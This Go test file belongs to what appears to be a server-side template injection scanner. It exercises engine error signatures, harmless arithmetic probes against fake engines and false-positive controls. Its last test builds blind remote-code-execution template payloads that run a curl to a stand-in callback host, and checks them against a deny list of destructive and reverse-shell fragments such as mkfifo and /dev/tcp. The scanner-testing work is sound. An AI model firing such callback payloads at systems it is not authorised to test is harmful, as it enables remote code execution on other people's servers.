package sstiscan

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"testing"
)

// TestGoTemplateNeedsBothSignatures checks that a single common fragment such
// as "template: " no longer names an engine on its own.
func TestGoTemplateNeedsBothSignatures(t *testing.T) {
	if engine, _ := firstErrorSignature(`<p>template: the value is missing</p>`, ""); engine != "" {
		t.Errorf("a lone 'template: ' named engine %q", engine)
	}
	body := `template: page:1: function "foo" not defined executing "page" at <foo>`
	if engine, _ := firstErrorSignature(body, ""); engine != goTemplateEngine {
		t.Errorf("full Go template error named %q, want %q", engine, goTemplateEngine)
	}
}

// TestGenericJavaScriptErrorIsNotAnEngine checks that ordinary JS error text
// no longer triggers the error-signature module.
func TestGenericJavaScriptErrorIsNotAnEngine(t *testing.T) {
	body := `Uncaught SyntaxError: Unexpected token '<' in JSON at position 0`
	if engine, _ := firstErrorSignature(body, ""); engine != "" {
		t.Errorf("generic JS error named engine %q", engine)
	}
}

// TestErrorSignatureIgnoresBaseline checks that a signature the original page
// already shows is never reported as a reaction to the payload.
func TestErrorSignatureIgnoresBaseline(t *testing.T) {
	page := `<pre>jinja2.exceptions.TemplateSyntaxError: docs example</pre>`
	if engine, _ := firstErrorSignature(page, page); engine != "" {
		t.Errorf("signature already on the baseline was reported as %q", engine)
	}
}

// TestErrorSignatureIsDeterministic checks that when two engines could match,
// the same body always names the same one.
func TestErrorSignatureIsDeterministic(t *testing.T) {
	body := "jinja2.exceptions and PebbleException"
	first, _ := firstErrorSignature(body, "")
	for i := 0; i < 200; i++ {
		if got, _ := firstErrorSignature(body, ""); got != first {
			t.Fatalf("engine changed between calls: %q then %q", first, got)
		}
	}
}

// TestNewErrorSignatures checks the engine error fragments added for Razor,
// Tornado, Django, Liquid, and Handlebars, and that Handlebars needs its
// parser text and its expectation text together.
func TestNewErrorSignatures(t *testing.T) {
	cases := map[string]string{
		"Razor":      `System error: Microsoft.AspNetCore.Razor.Language.RazorCompilerException`,
		"Tornado":    `tornado.template.ParseError: unclosed block`,
		"Django":     `django.template.exceptions.TemplateSyntaxError: Invalid block tag`,
		"Liquid":     `Liquid::SyntaxError: Expected end of variable`,
		"Handlebars": "Parse error on line 1:\n{{=\n--^\nExpecting 'ID', got 'INVALID'",
	}
	for want, body := range cases {
		if got, _ := firstErrorSignature(body, ""); got != want {
			t.Errorf("body for %s named %q", want, got)
		}
	}
	if got, _ := firstErrorSignature("Parse error on line 3 of the CSV export", ""); got != "" {
		t.Errorf("a lone 'Parse error on line' named %q", got)
	}
}

// TestDjangoTraceNotNamedJinja checks that a Django syntax error is not
// attributed to Jinja2, which shares the bare TemplateSyntaxError name.
func TestDjangoTraceNotNamedJinja(t *testing.T) {
	body := `django.template.exceptions.TemplateSyntaxError: Invalid filter`
	if got, _ := firstErrorSignature(body, ""); got == "Jinja2" {
		t.Errorf("Django TemplateSyntaxError was attributed to Jinja2")
	}
}

// TestContainsStandaloneRejectsPartialNumbers checks the whole-token rule: the
// expected result must not be glued to another digit or letter, so a number
// that merely contains it does not count as evaluated output.
func TestContainsStandaloneRejectsPartialNumbers(t *testing.T) {
	cases := []struct {
		haystack string
		want     bool
	}{
		{"total 9801547", true},
		{"9801547", true},
		{"value 9801547.", true},
		{"order 19801547", false},
		{"ref 98015470", false},
		{"x9801547", false},
		{"9801547x", false},
		{"", false},
	}
	for _, c := range cases {
		if got := containsStandalone(c.haystack, "9801547"); got != c.want {
			t.Errorf("containsStandalone(%q, 9801547) = %v, want %v", c.haystack, got, c.want)
		}
	}
}

// TestProbeValuesAreFresh checks that every probe build draws new operands, so
// no fixed constant can be memorized, and that each math result is eight
// digits or fewer.
func TestProbeValuesAreFresh(t *testing.T) {
	for _, p := range sstiProbes() {
		// The Python string-multiply probe is a fixed disambiguator, not a
		// detection probe, so it is deliberately the same every time.
		if p.engine == "Jinja2 (Python string-multiply)" {
			continue
		}
		seen := map[string]bool{}
		for i := 0; i < 5; i++ {
			payload, _ := p.build()
			if seen[payload] {
				t.Errorf("probe %q repeated the payload %q", p.engine, payload)
			}
			seen[payload] = true
		}
	}
}

// evalRule is one benign template expression form a vulnerable engine might
// evaluate. eval receives the regexp submatches and returns the rendered result,
// the way the named engine would render that form.
type evalRule struct {
	re   *regexp.Regexp
	eval func(m []string) string
}

// evalRules is keyed by a short name a test asks for. The forms are benign:
// arithmetic, string multiplication, and string concatenation only.
var evalRules = map[string]evalRule{
	"jinja-math":     {regexp.MustCompile(`\{\{\s*(\d+)\s*\*\s*(\d+)\s*\}\}`), mulRule},
	"jinja-strmul":   {regexp.MustCompile(`\{\{\s*(\d+)\s*\*\s*'(\d)'\s*\}\}`), func(m []string) string { return strings.Repeat(m[2], atoi(m[1])) }},
	"jinja-concat":   {regexp.MustCompile(`\{\{\s*'(\w+)'\s*~\s*'(\w+)'\s*\}\}`), concatRule},
	"dollar-math":    {regexp.MustCompile(`\$\{\s*(\d+)\s*\*\s*(\d+)\s*\}`), mulRule},
	"dollar-concat":  {regexp.MustCompile(`\$\{\s*'(\w+)'\s*\+\s*'(\w+)'\s*\}`), concatRule},
	"erb-math":       {regexp.MustCompile(`<%=\s*(\d+)\s*\*\s*(\d+)\s*%>`), mulRule},
	"erb-concat":     {regexp.MustCompile(`<%=\s*'(\w+)'\s*\+\s*'(\w+)'\s*%>`), concatRule},
	"razor-math":     {regexp.MustCompile(`@\((\d+)\s*\*\s*(\d+)\)`), mulRule},
	"razor-concat":   {regexp.MustCompile(`@\("(\w+)"\s*\+\s*"(\w+)"\)`), concatRule},
	"smarty-math":    {regexp.MustCompile(`\{math equation="(\d+)\s*\*\s*(\d+)"\}`), mulRule},
	"velocity":       {regexp.MustCompile(`#set\(\$aperture=(\d+)\*(\d+)\)\$aperture`), mulRule},
	"thymeleaf":      {regexp.MustCompile(`\[\[\$\{(\d+)\*(\d+)\}\]\]`), mulRule},
	"pug":            {regexp.MustCompile(`#\{(\d+)\*(\d+)\}`), mulRule},
	"dot":            {regexp.MustCompile(`\{\{=(\d+)\*(\d+)\}\}`), mulRule},
	"smarty-bare":    {regexp.MustCompile(`\{(\d+)\*(\d+)\}`), mulRule},
	"unrelated-text": {regexp.MustCompile(`never-matches-anything-here`), mulRule},
}

// mulRule renders an integer product. A value that does not parse yields a
// result that cannot match a probe, so it fails safely.
func mulRule(m []string) string { return fmt.Sprint(atoi(m[1]) * atoi(m[2])) }

// concatRule joins two captured strings.
func concatRule(m []string) string { return m[1] + m[2] }

// atoi converts a digit string captured by a rule; the rules only capture digit
// runs, so the error case cannot occur.
func atoi(s string) int {
	n := 0
	for _, c := range s {
		n = n*10 + int(c-'0')
	}
	return n
}

// fakeEngine returns a handler that behaves like a template engine which
// evaluates exactly the named forms and echoes everything else as plain text.
func fakeEngine(rules ...string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		out := r.URL.Query().Get("q")
		for _, name := range rules {
			rule := evalRules[name]
			out = rule.re.ReplaceAllStringFunc(out, func(s string) string {
				return rule.eval(rule.re.FindStringSubmatch(s))
			})
		}
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, "<p>%s</p>", out)
	}
}

// mathPoint is a query-parameter injection point on the given server.
func mathPoint(srv *httptest.Server) injectionPoint {
	return injectionPoint{Kind: kindQuery, URL: srv.URL + "/render", Method: "GET", Param: "q", Defaults: url.Values{"q": {"x"}}}
}

// runMath runs the math module over one point on a server and returns the
// findings it produced.
func runMath(t *testing.T, handler http.HandlerFunc, baseline string) []Finding {
	t.Helper()
	srv := httptest.NewServer(handler)
	t.Cleanup(srv.Close)
	deps := runDeps{points: []injectionPoint{mathPoint(srv)}, sem: make(chan struct{}, 4), baseline: baseline}
	return runMathEvalModule(context.Background(), deps)
}

// TestMathEvalConfirmsRealEvaluation checks that an engine which evaluates the
// arithmetic form is confirmed, and that the string-multiply probe relabels a
// Jinja2 hit as Python Jinja2.
func TestMathEvalConfirmsRealEvaluation(t *testing.T) {
	findings := runMath(t, fakeEngine("jinja-math", "jinja-strmul"), "<p>x</p>")
	if len(findings) != 1 {
		t.Fatalf("got %d findings, want 1: %+v", len(findings), findings)
	}
	f := findings[0]
	if f.Confidence != ConfidenceConfirmed {
		t.Errorf("confidence = %q, want confirmed", f.Confidence)
	}
	if !strings.Contains(f.Label, "Jinja2 (Python)") {
		t.Errorf("label %q does not name the disambiguated engine", f.Label)
	}
}

// TestMathEvalEngineLabels checks that each engine's own syntax is reported
// under that engine's name, so a finding names the engine the operator should
// look at.
func TestMathEvalEngineLabels(t *testing.T) {
	cases := []struct {
		rule, wantLabel string
	}{
		{"erb-math", "ERB / EJS"},
		{"razor-math", "Razor"},
		{"smarty-math", "Smarty"},
		{"velocity", "Velocity"},
		{"thymeleaf", "Thymeleaf"},
		{"pug", "Pug / Jade / JSF EL"},
		{"dot", "doT"},
		{"dollar-math", "FreeMarker / Mako / JSP EL / Spring EL / Groovy"},
	}
	for _, c := range cases {
		findings := runMath(t, fakeEngine(c.rule), "<p>x</p>")
		if len(findings) != 1 {
			t.Errorf("%s: got %d findings, want 1", c.rule, len(findings))
			continue
		}
		if !strings.Contains(findings[0].Label, c.wantLabel) {
			t.Errorf("%s: label %q does not name %q", c.rule, findings[0].Label, c.wantLabel)
		}
	}
}

// TestMarkerProbeNeedsNoDigits checks the digit-free probe: an engine that
// only joins string literals (no arithmetic) is still found, with the random
// marker as evidence.
func TestMarkerProbeNeedsNoDigits(t *testing.T) {
	findings := runMath(t, fakeEngine("dollar-concat"), "<p>x</p>")
	if len(findings) != 1 {
		t.Fatalf("got %d findings for a concatenation-only engine, want 1", len(findings))
	}
	if strings.ContainsAny(findings[0].Evidence, "0123456789") {
		t.Errorf("marker evidence %q should be digit-free", findings[0].Evidence)
	}
}

// TestPlainEchoIsNotAnEngine checks that an engine that evaluates nothing, and
// simply echoes the input, produces no finding for any probe form.
func TestPlainEchoIsNotAnEngine(t *testing.T) {
	if findings := runMath(t, fakeEngine("unrelated-text"), "<p>x</p>"); len(findings) != 0 {
		t.Errorf("plain echo produced %d finding(s)", len(findings))
	}
}

// TestMathEvalIgnoresPagesThatPrintTheNumber checks the false-positive
// controls. A number already on the original page is not evaluated output. A
// page that keeps printing the last computed result, even for a neutral value,
// is not template evaluation either.
func TestMathEvalIgnoresPagesThatPrintTheNumber(t *testing.T) {
	// The page prints the number it computed earlier, whatever the input. That
	// makes the neutral control show the result too, so no finding is reported.
	var mu sync.Mutex
	last := ""
	sticky := func(w http.ResponseWriter, r *http.Request) {
		q := r.URL.Query().Get("q")
		mu.Lock()
		defer mu.Unlock()
		if m := regexp.MustCompile(`\{\{\s*(\d+)\s*\*\s*(\d+)\s*\}\}`).FindStringSubmatch(q); m != nil {
			last = fmt.Sprint(atoi(m[1]) * atoi(m[2]))
		}
		fmt.Fprintf(w, "<p>Order total: %s</p>", last)
	}
	if findings := runMath(t, sticky, "<p>nothing</p>"); len(findings) != 0 {
		t.Errorf("page that prints the computed result regardless of input was reported: %+v", findings)
	}
}

// TestEvaluatedRules checks the predicate every math hit must pass: the result
// is a whole token in the body, the literal payload is not echoed, and the
// result was not already on the baseline page.
func TestEvaluatedRules(t *testing.T) {
	const payload = "{{1234*5678}}"
	const expected = "7006652"
	cases := []struct {
		name, body, baseline string
		want                 bool
	}{
		{"evaluated result", "<p>7006652</p>", "<p>x</p>", true},
		{"literal echoed", "<p>{{1234*5678}} = 7006652</p>", "<p>x</p>", false},
		{"result already on baseline", "<p>7006652</p>", "<p>7006652</p>", false},
		{"result inside a longer number", "<p>id 17006652</p>", "<p>x</p>", false},
		{"no result", "<p>nothing</p>", "<p>x</p>", false},
	}
	for _, c := range cases {
		if got := evaluated(c.body, payload, expected, c.baseline); got != c.want {
			t.Errorf("%s: evaluated = %v, want %v", c.name, got, c.want)
		}
	}
}

// TestErrorSignatureNeedsNeutralControl checks the error-module control: a page
// that shows an engine's error for every input, including a harmless one, is
// not an engine reacting to the polyglot.
func TestErrorSignatureNeedsNeutralControl(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, `<pre>Twig\Error: the search service is down</pre>`)
	}))
	defer srv.Close()
	deps := runDeps{points: []injectionPoint{mathPoint(srv)}, sem: make(chan struct{}, 4), baseline: "<p>x</p>"}
	if findings := runErrorSignatureModule(context.Background(), deps); len(findings) != 0 {
		t.Errorf("error shown for every input was reported: %+v", findings)
	}
}

// TestErrorSignatureFindsEngineReaction checks the positive error case: the
// engine error appears only when the polyglot is sent, not for the neutral
// value.
func TestErrorSignatureFindsEngineReaction(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.Query().Get("q"), "${{<%[%") {
			fmt.Fprint(w, `<pre>jinja2.exceptions.TemplateSyntaxError: unexpected '}'</pre>`)
			return
		}
		fmt.Fprint(w, "<p>ok</p>")
	}))
	defer srv.Close()
	deps := runDeps{points: []injectionPoint{mathPoint(srv)}, sem: make(chan struct{}, 4), baseline: "<p>ok</p>"}
	findings := runErrorSignatureModule(context.Background(), deps)
	if len(findings) != 1 {
		t.Fatalf("got %d findings, want 1", len(findings))
	}
	if !strings.Contains(findings[0].Label, "Jinja2") {
		t.Errorf("label %q does not name Jinja2", findings[0].Label)
	}
	if findings[0].Confidence != ConfidenceLikely {
		t.Errorf("confidence = %q, want likely", findings[0].Confidence)
	}
}

// TestRCEPayloadsAreCallbacksOnly checks the blind-RCE payload set: every
// payload runs a single curl of the callback address and nothing else, so no
// payload deletes, writes, or otherwise changes the target.
func TestRCEPayloadsAreCallbacksOnly(t *testing.T) {
	const cmd = "curl http://callback.example/collab/tok/"
	for _, rp := range rceTemplatePayloads {
		payload := rp.build(cmd)
		if !strings.Contains(payload, "curl") {
			t.Errorf("%s payload does not call back: %q", rp.engine, payload)
		}
		for _, bad := range []string{"rm ", "rm-", "mkfifo", "/dev/tcp", "shutdown", "> /", "dd if"} {
			if strings.Contains(payload, bad) {
				t.Errorf("%s payload contains a destructive or shell-escape fragment %q", rp.engine, bad)
			}
		}
	}
}
